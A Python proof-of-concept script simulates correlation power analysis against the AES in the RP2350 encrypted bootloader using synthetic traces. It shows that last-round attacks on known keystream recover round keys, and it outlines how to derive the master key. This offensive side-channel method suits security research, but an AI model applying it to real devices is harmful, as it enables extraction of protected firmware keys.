#!/usr/bin/env python3
"""CPA proof-of-concept on SYNTHETIC traces for the RP2350 enc_bootloader AES.
No hardware. Validates the attack pipeline and shows which CPA variant actually
works against this target's fixed-input reality.

Leakage model: Hamming weight of an intermediate, plus Gaussian noise. This is
the standard textbook model for table-based AES (mbedtls here is table-based,
unmasked, and upstream itself states it "is not secure against side channel
attacks").

Experiments:
  A) FIRST-round CPA, random known inputs  -> recovers all 16 bytes of RK0 (pipeline valid)
  B) FIRST-round CPA, only nonce[15] varies -> ~2 bytes (fixed input defeats it)
  C) LAST-round CPA on known keystream, only nonce[15] varies -> all 16 bytes of RK14
     (avalanche makes the whole OUTPUT vary even when one input byte moves)

Takeaway: at fixed input, attack the OUTPUT (last round) using known keystream,
not the input (first round). Then rk14 -> rk13 -> invert the AES-256 key schedule
-> master key. Verify with the keystream[0] oracle.
"""
import sys, os, random, math
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from decrypt_rp2350 import aes256_encrypt_block, _key_expansion_256, _SBOX

random.seed(1234)
SBOX = bytes(_SBOX)
INV_SBOX = [0]*256
for i, v in enumerate(_SBOX):
    INV_SBOX[v] = i

def hw(x): return bin(x).count("1")
HWT = [hw(i) for i in range(256)]

def corr(xs, ys):
    n = len(xs); mx = sum(xs)/n; my = sum(ys)/n
    num = sum((a-mx)*(b-my) for a, b in zip(xs, ys))
    dx = math.sqrt(sum((a-mx)**2 for a in xs)); dy = math.sqrt(sum((b-my)**2 for b in ys))
    return 0.0 if dx == 0 or dy == 0 else num/(dx*dy)

def input_var(blocks): return [len(set(b[i] for b in blocks)) for i in range(16)]

# ---------------------------------------------------------------- first round
def first_round_cpa(key16, inputs, sigma=1.5):
    traces = [[HWT[SBOX[b[i] ^ key16[i]]] + random.gauss(0, sigma) for i in range(16)] for b in inputs]
    rec, conf = [], []
    for i in range(16):
        col = [t[i] for t in traces]
        bg, bc = 0, -1.0
        for g in range(256):
            hyp = [HWT[SBOX[b[i] ^ g]] for b in inputs]
            c = abs(corr(hyp, col))
            if c > bc: bc, bg = c, g
        rec.append(bg); conf.append(bc)
    return rec, conf

# ---------------------------------------------------------------- last round
def last_round_cpa(key32, nonces, sigma=1.5):
    w = _key_expansion_256(key32)
    rk14 = [0]*16
    for c in range(4):
        for r in range(4):
            rk14[c*4+r] = w[56+c][r]
    cts = [aes256_encrypt_block(key32, n) for n in nonces]           # known keystream (output)
    traces = [[HWT[INV_SBOX[ct[j] ^ rk14[j]]] + random.gauss(0, sigma) for j in range(16)] for ct in cts]
    rec = []
    for j in range(16):
        col = [t[j] for t in traces]
        bg, bc = 0, -1.0
        for g in range(256):
            hyp = [HWT[INV_SBOX[cts[n][j] ^ g]] for n in range(len(cts))]
            c = abs(corr(hyp, col))
            if c > bc: bc, bg = c, g
        rec.append(bg)
    return rec, rk14

def show(tag, truth, rec, var):
    ok = [rec[i] == truth[i] for i in range(16)]
    print(f"\n=== {tag} ===")
    print("truth:", " ".join("%02x" % b for b in truth))
    print("rec  :", " ".join("%02x" % b for b in rec))
    print("ok   :", " ".join(" V" if o else " x" for o in ok))
    print("inVar:", " ".join("%2d" % v for v in var), "(distinct input values per byte)")
    print(f"recovered {sum(ok)}/16 bytes")

N = 4000
KEY16 = [random.randrange(256) for _ in range(16)]       # = RK0

# A) first-round, random inputs
rnd = [[random.randrange(256) for _ in range(16)] for _ in range(N)]
rec, _ = first_round_cpa(KEY16, rnd)
show("A) FIRST-round CPA, random inputs", KEY16, rec, input_var(rnd))

# B) first-round, only nonce[15] varies (device reality), small counter
iv0 = [random.randrange(256) for _ in range(16)]
blk = []
for k in range(N):
    b = list(iv0); b[15] = iv0[15] ^ (k & 0xff); blk.append(b)   # only LSB moves at realistic block counts
rec, _ = first_round_cpa(KEY16, blk)
show("B) FIRST-round CPA, only nonce[15] varies", KEY16, rec, input_var(blk))

# C) last-round, only nonce[15] varies, known keystream
KEY32 = bytes(random.randrange(256) for _ in range(32))
nonces = []
for v in range(256):
    n = list(iv0); n[15] = v; nonces.append(bytes(n))
rec, rk14 = last_round_cpa(KEY32, nonces)
show("C) LAST-round CPA on known keystream, only nonce[15] varies", rk14, rec, input_var(nonces))

# C') same with only 12 known outputs (what the app vector table realistically gives)
rec12, rk14b = last_round_cpa(KEY32, nonces[:12], sigma=0.8)
ok12 = sum(rec12[j] == rk14b[j] for j in range(16))
print(f"\nC') LAST-round with only 12 known outputs: {ok12}/16 bytes of rk14")

print("""
=== TAKEAWAY ===
A: random/known inputs -> full RK0. Pipeline valid.
B: device reality (one IV per boot, only nonce[15] effectively varies at ~3122 blocks)
   -> FIRST-round CPA gets ~2 bytes: the input is fixed, no correlation on frozen bytes.
C: LAST-round CPA on the known keystream recovers ALL 16 bytes of RK14 even when only
   nonce[15] varies -- AES avalanche makes the whole OUTPUT vary. THIS is the right method.
   Then rk13 the same way (2nd-to-last round) -> invert the AES-256 key schedule
   (rk13+rk14 = 8 words = full master key) -> verify with keystream[0] oracle
   (iv0 = AES_dec(key, ks0), salt = iv0 ^ IV_public).
Known-output requirement: keystream_k = CT_k XOR predicted PT_k. The app vector table is
   predictable for ~12 blocks (base 0x20000000), giving enough known outputs.
Note: "CPA on the key schedule" is NOT valid CPA -- with a fixed key setkey is
   deterministic (zero variance across traces). That path is SPA/template profiling
   (needs a clone with known keys), a fallback only if <~6 known output blocks exist.
""")
